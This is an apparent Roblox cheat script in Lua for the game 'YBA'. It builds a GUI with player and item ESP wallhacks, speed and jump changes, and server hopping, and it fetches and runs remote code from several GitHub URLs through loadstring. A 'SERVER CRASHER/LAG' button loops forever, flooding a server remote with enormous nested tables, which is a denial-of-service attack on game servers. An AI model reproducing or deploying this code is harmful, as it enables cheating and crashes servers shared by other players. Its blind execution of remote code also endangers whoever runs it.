local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "YBA GUI V2 [BETA]", IntroEnabled = true, IntroText = YBA GUI V2, HidePremium = true, SaveConfig = true, ConfigFolder = "YBA Test GUI"})
local Tab = Window:MakeTab({
	Name = "Combat",
	PremiumOnly = false
})
local Section = Tab:AddSection({
	Name = "ESP"
})
Tab:AddButton({
	Name = "Item ESP",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hellyeah1/yba-item-esp/main/ybaitemesp.lua",true))()
  	end    
})
Tab:AddButton({
	Name = "Players ESP",
	Callback = function()
        local color = BrickColor.new(252, 255, 253)
        local transparency = .8
        
        local Players = game:GetService("Players")
        local function _ESP(c)
          repeat wait() until c.PrimaryPart ~= nil
          for i,p in pairs(c:GetChildren()) do
            if p.ClassName == "Part" or p.ClassName == "MeshPart" then
              if p:FindFirstChild("shit") then p.shit:Destroy() end
              local a = Instance.new("BoxHandleAdornment",p)
              a.Name = "shit"
              a.Size = p.Size
              a.Color = color
              a.Transparency = transparency
              a.AlwaysOnTop = true    
              a.Visible = true    
              a.Adornee = p
              a.ZIndex = true    
        
            end
          end
        end
        local function ESP()
          for i,v in pairs(Players:GetChildren()) do
            if v ~= game.Players.LocalPlayer then
              if v.Character then
                _ESP(v.Character)
              end
              v.CharacterAdded:Connect(function(chr)
                _ESP(chr)
              end)
            end
          end
          Players.PlayerAdded:Connect(function(player)
            player.CharacterAdded:Connect(function(chr)
              _ESP(chr)
            end)  
          end)
        end
        ESP()
  	end    
})
local Section = Tab:AddSection({
	Name = "Auto Farm"
})
local Tab = Window:MakeTab({
	Name = "Character",
	PremiumOnly = false
})
local Section = Tab:AddSection({
	Name = "Base character"
})
Tab:AddSlider({
	Name = "Speed",
	Min = 0,
	Max = 500,
	Default = 16,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
	end    
})
Tab:AddSlider({
	Name = "Jump",
	Min = 0,
	Max = 500,
	Default = 5,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
	end    
})
local Tab = Window:MakeTab({
	Name = "Misc",
	PremiumOnly = false
})
local Section = Tab:AddSection({
	Name = "Server"
})
Tab:AddButton({
	Name = "SERVER CRASHER/LAG",
	Callback = function()
      		

while wait(0.6) do 
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
    local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then
    return nil
    end
    local calculateperfectval = (mainvalueifonetable/(val+2))
    return calculateperfectval
    end
    local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    z = spammedtable[1]
    for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
    end
    local calculatemax = getmaxvalue(tableincrease)
    local maximum
    if calculatemax then
    maximum = calculatemax
    else
    maximum = 999999
    end
    for i = 1, maximum do
    table.insert(maintable, spammedtable)
    end
    for i = 1, tries do
    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
    end
    end
    bomb(250, 2) 
    end
  	end    
})
Tab:AddButton({
	Name = "Server Hop",
	Callback = function()
        local module = loadstring(game:HttpGet"https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()

        module:Teleport(game.PlaceId)
  	end    
})
Tab:AddButton({
	Name = "rejoin",
	Callback = function()
        local ts = game:GetService("TeleportService")

        local p = game:GetService("Players").LocalPlayer
        
         
        
        ts:Teleport(game.PlaceId, p)
  	end    
})
OrionLib:Init()
